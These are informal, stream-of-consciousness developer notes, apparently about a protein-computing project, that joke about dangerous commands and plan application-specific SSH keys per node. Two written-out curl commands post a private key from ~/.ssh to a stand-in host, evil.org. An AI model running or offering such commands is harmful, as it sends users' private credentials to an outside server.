it seems absolutely insane to shout things out of ~/.ssh

Like

The common joke of worst command is often rm -rf / or alias ls=rm
But like
curl -i -X POST -H "Content-Type: multipart/form-data" -F "data=@~/.ssh/<private key>" http://www.evil.org
Also holy shit best domain ever. Somebody owns it and ofc defcon links lmao.

curl -F "file=@~/.ssh/id_ed_numbers_not_dot_pub" http://www.evil.org

Yeah I'm gonna do it anyway.
But 
Man maybe only if a flag is set.
Yeah.

And to fucking multicast it. Like
Oh my god.
Anyway. This is about protein not security. 

So the flag.
SECURITY_HAZARD_ENABLED=enthusiastic_yes

Okay I got it. 
This doesn't improve security like
at all
but 
Specific keys.
Application-specific keys.
With specific names.

Okay so we're callin em
~/.ssh/polychoron-node-key
But it looks like this needs to be manually generated per node.
Which lame.
Probably automatable but
